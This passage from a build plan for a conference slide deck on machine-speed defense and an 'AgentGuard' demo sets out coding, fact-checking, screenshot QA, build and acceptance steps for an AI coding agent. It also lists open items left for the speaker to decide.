- **Accessibility:** contrast ≥ 4.5:1 for body text; never rely on color alone for severity (always a label).

---

## 8. Build, review, deliver

1. **Scaffold:** clone the prior deck repo into a new repo `Presentation---DSS2026-Machine-Speed-Defense`; `npm install`; `npm run dev` on :3000.
2. **Slides:** one file per slide in `src/slides/NN_Name.tsx`, exported component plus a `notes` string export:
   ```ts
   export const notes = `...speaker notes, one bullet per line...`;
   ```
   `App.tsx` builds the `slides` array in §5 order and passes `notes` to a tiny presenter overlay (toggle with `n`) — add this to `Presentation.tsx`; keep it under 60 lines.
3. **Verify facts:** before building slides 11, 12, 13, 16, 17, 21, re-read the cited source files and copy strings verbatim. Keep a `SOURCES.md` in the repo that mirrors §6 and records the commit SHA of `apps` and `AgentGuard` used.
4. **Type-check:** `npm run lint` must be clean.
5. **Visual QA:** use Playwright to open each slide (`goToSlide` is exposed; add `?slide=N` query support in `App.tsx`) at 1920×1080 and save `qa/slide-NN.png`. Check: nothing clipped, nothing overflowing the 16:9 card, code panels readable, step-reveals completed (press Space until the counter advances).
6. **Build:** `npm run build` with `vite-plugin-singlefile` to produce `dist/index.html` that opens offline (the demo video is large — keep it as a sibling file, not inlined; `demo.gif` may be inlined).
7. **PDF fallback:** print each slide screenshot into `deck.pdf` (any ordering tool is fine) in case the venue requires a PDF.
8. **Acceptance checklist** (all must be true):
   - [ ] every promise in §2 maps to a built slide
   - [ ] every number on every slide appears in §6, and illustrative SQL is tagged
   - [ ] no slide has more than ~40 words of prose
   - [ ] `npm run lint` clean, single-file build opens from `file://`
   - [ ] 22 screenshots in `qa/`, reviewed
   - [ ] speaker notes present for all slides
   - [ ] the scope footnote on slide 16 (holds need the server) is present
   - [ ] speaker name and session length confirmed or still clearly marked as placeholders

---

## 9. Open items for the speaker (not for Claude Code to decide)

1. Session length and whether there is a live-demo network — determines whether slides 11, 14, 19 stay.
2. Speaker name/title for slides 01 and 22.
3. Whether to show real baseline/chain rules from the private catalog (slides 12–13) or keep them illustrative.
4. Whether the demo is live or the recorded `AgentGuardDemo.mp4`.
